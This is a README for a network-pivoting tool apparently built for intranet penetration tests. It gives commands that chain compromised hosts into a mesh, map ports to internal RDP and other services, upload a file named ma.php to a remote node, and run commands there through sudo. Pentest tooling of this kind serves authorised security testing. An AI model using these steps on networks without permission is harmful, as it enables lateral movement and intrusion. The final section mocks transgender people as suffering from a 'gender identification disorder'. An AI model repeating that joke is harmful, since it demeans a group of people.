# Mesh Tweaked for Advanced Penetration Testing

**Cloud native** mesh networking, now introduced to intranet pentests.

## Build and Install

Pre-compiled binaries could be found on GitHub Releases.

For Mainland Chinese users, please use the [Coding.net mirror]().

### Manually build from source

1. Download `go>=1.18`,
2. Clone this repository and `make` to build the binaries from source.

## Usage

Learn usages through an example.

Assuming:

1. you are using `192.168.137.1/24`,
2. you have taken down `192.168.137.101/24`,
3. `192.168.137.101/24` also has address `192.168.56.101/24`,
4. you have taken down `192.168.56.102/24` too,
5. `192.168.56.102` also has address `10.103.10.102/24`.
6. now you want to break into `10.103.10.0/24` through `192.168.56.102/24`

Setup mesh network on the entrypoint:

```shell
# Exec on 192.168.137.101
./mtsvc -l "mtstp://0.0.0.0:10080"
```

Connect an individual endpoint to the mesh network:

```shell
# Exec on 192.168.137.102
./mtsvc -u "mtstp://192.168.137.101:10080"
```

Or ALTERNATIVELY, connect from entrypoint to that individual endpoint:

```shell
# Exec on 192.168.137.102
./mtsvc -l "mtstp://0.0.0.0:10080"
# Exec on the interactive shell later. druB is node name of `101`.
addprobe durB 192.168.137.102:10080
```

Access the mesh endpoint, interactively:

```shell
# Exec on 192.168.137.1
./mtsvc -u "mtstp://192.168.137.101:10080" -i
# Exec query without being interactive
./mtsvc -u "mtstp://192.168.137.101:10080" -c "listnodes"
```

Show nodes on the mesh network:

```shell
listnodes
```

Create tunnel mapping:

```shell
# Aagd is node name of `192.168.56.102`
addmapping zero:192.168.137.1:4321 Aagd:10.103.10.34:3389
# if ip address is 0.0.0.0 or same as node ip,
# or specified with `--listen` flag, the mapping will be reversal
addmapping zero:192.168.137.1:10050 Aagd:10.103.10.102:10050
addmapping zero:192.168.137.1:10050 Aagd::10050 --listen
```

Upload and exec command on remote node:

```shell
# Inspect node
inspect Aagd
# Upload or download files with syncfile
syncfile /tmp/ma.php Aagd:/tmp/ma.php
# Will execute with environment loaded non-login shell as "arthur"
execute "whoami" --sudo "arthur" --password "123456"
```

Use `[fe80::wtf]` if you want to conquer over IPv6.

## Protocols

By default, MTFAPT use MTSTP as protocol for control plane, and
direct L4 routing for data plane.

Alternatively you can use http to wrap up both
control plane or data plane.

socks5, http/2, https, QUIC,DNS,WS+TLS will be supported in the future.

## One more thing

This framework may be robust enough to serve as a L4 service mesh in the future.

## And another one...

Name it *MtFs Accept Pp Trimmed* to support those who are suffering
from gender identification disorder on the earth!
